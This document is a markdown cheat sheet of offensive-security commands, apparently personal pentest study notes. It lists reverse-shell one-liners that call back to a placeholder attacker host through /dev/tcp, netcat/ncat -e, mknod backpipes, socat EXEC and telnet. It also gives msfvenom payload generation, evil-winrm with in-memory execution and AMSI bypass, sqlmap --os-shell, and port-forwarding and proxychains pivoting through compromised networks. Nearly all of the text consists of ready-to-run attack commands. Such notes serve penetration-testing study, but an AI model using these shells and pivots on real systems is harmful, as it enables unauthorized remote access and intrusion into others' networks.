# [/dev/tcp](https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/):
#### `sh -i >& /dev/tcp/X.X.X.X/YYY 0>&1`
  * [archived](https://web.archive.org/web/20190920152858/https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/)

# [evil-winrm](https://github.com/Hackplayers/evil-winrm):
#### `evil-winrm -i X.X.X.X -u <username> -p <password>`
#### `evil-winrm -i X.X.X.X -u <username> -p -s <path/to/ps1>`
#### `evil-winrm -i X.X.X.X -u <username> -e <path/on/attack>`
#### `Invoke-Binary <path/to/csharpexe>`
#### `Donut-Loader`
#### `Bypass-4MSI`
  * -s allows you to load powershell scripts from Kali to the victim
  * Invoke-Binary runs C# executables in memory; the executables must be in the path set by the -e flag in the prior command
  * Donut-Loader and Bypass-4MSI look useful but I don't know how to use them yet

# [mknod](https://man7.org/linux/man-pages/man1/mknod.1.html):
#### `mknod /tmp/backpipe p`
#### `/bin/sh 0</tmp/backpipe | nc X.X.X.X YYY 1>/tmp/backpipe`
#### `mknod /tmp/backpipe p && telnet X.X.X.X YYY 0</tmp/backpipe | /bin/sh 1>/tmp/backpipe`
  * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

# [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
#### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows`
#### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows -b "\x00\x0a\x0d"`
  * -p chooses the payload
  * -n prepends a nop sled
  * -a chooses the architecture
  * -b defines bad chars so it won't use them (as a string)
  * -o is the output file
  * -f defines the output format (for instance, a c file)
  * --platform chooses the platform (for instance, windows)
  * LHOST handles the callback ip
  * LPORT handles the callback port

# [ncat](https://linux.die.net/man/1/ncat):
#### `ncat -lnvp YYY`
#### `ncat X.X.X.X YYY -e (/bin/sh or cmd.exe)`
#### `ncat -lnvp --ssl --allow Z.Z.Z.Z YYY`
#### `ncat X.X.X.X YYY -ssl (/bin/sh or cmd.exe)`
  * basically a netcat rewrite with some updated features
  * --ssl will encrypt the traffic using a temporary key
  * --allow will only allow connections from the specified host

# [netcat](https://linux.die.net/man/1/nc):
#### `nc -lnvp YYY`
#### `nc X.X.X.X YYY -e (/bin/sh or cmd.exe)`
#### `nc -lnvp YYY -e (/bin/sh or cmd.exe)`
#### `nc X.X.X.X YYY`
#### `nc -lnvp YYY > (name.sh or name.exe)`
#### `nc X.X.X.X YYY < (name.sh or name.exe)`
  * -e binds a command
  * -l listens
  * -p is the source port
  * -n prevents DNS lookups on addresses, hostnames, and ports
  
# [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts):
#### `netsh interface portproxy add v4tov4 listenport=YYY listenaddress=X.X.X.X connectport=BBB connectaddress=A.A.A.A`
#### `netsh advfirewall firewall add rule name="rule_name" protocol=TCP dir=in localip=X.X.X.X localport=YYY action=allow`  
  * Above interface command creates a listener on X.X.X.X:YYY that forwards to A.A.A.A:BBB
  * Above advfirewall command creates a firewall rule that allows inbound traffic to X.X.X.X:YYY

# [proxychains](https://www.unix.com/man-page/debian/1/proxychains/):
#### `cat /etc/proxychains.conf`
#### `socks4 127.0.0.1 YYY`
#### `proxychains command`
  * Combine with `ssh -N -D` to source a given command through a pre-established tunnel
    * For instance you could nmap a machine on an internal network from an already-compromised host on that network

# [rinetd](https://manpages.debian.org/unstable/rinetd/rinetd.8.en.html):
#### `nano /etc/rinetd.conf`
#### `X.X.X.X YYY A.A.A.A BBB (in the conf file)`
#### `service rinetd restart`
  * Redirects traffic received on YYY from X.X.X.X to A.A.A.A:BBB
    * X.X.X.X can be 0.0.0.0 to redirect traffic from any source
  * Restart the service after changing the configuration file to apply changes

# [socat](https://linux.die.net/man/1/socat):
#### `socat - TCP4:X.X.X.X:YYY`
#### `socat TCP4-listen:YYY STDOUT`
#### `socat TCP4:X.X.X.X:YYY EXEC:(/bin/bash or cmd.exe)`
#### `socat TCP4-listen:YYY,fork file:name.txt`
#### `socat TCP4:X.X.X.X:YYY file:name.txt,create`

# [sqlmap](https://web.archive.org/web/20191201191308/https://github.com/sqlmapproject/sqlmap/wiki/Introduction):
#### `sqlmap -u X.X.X.X --crawl=1`
#### `sqlmap -u X.X.X.X/resource.php --dbms=mysql --os-shell`
  * -u specifies the url of the target
  * -l allows you to input an intercept file from burp
  * -f does dbms fingerprinting
  * --crawl does enumeration
  * --os-shell tries to get an interactive shell

# [ssh](https://linux.die.net/man/1/ssh):
#### `plink <username>@X.X.X.X`
#### `ssh <username>@X.X.X.X`
  * Establishes secure shell on the remote host with the provided username and password
  * -i specifies a key file to instead of a password
  * -p defines a port to connect to in the case on non-standard ssh ports
  * See pairing with [tunneling flags](https://github.com/kmanc/offensive_security/blob/master/notes/proxies.md#ssh) and Proxychains [proxies.md](https://github.com/kmanc/offensive_security/blob/master/notes/proxies.md#proxychains) for pivoting around a compromised network

# [telnet](https://linux.die.net/man/1/telnet):
#### `nc -nlvp YYY`
#### `nc -nlvp ZZZ`
#### `telnet X.X.X.X YYY | /bin/sh | telnet X.X.X.X ZZZ`
  * [archived](https://web.archive.org/web/20210310030514/https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
  * Run the top two commands on the attacker machine, then the bottom command on the victim
  * Type commands into the first shell window, then read the output from the second shell window

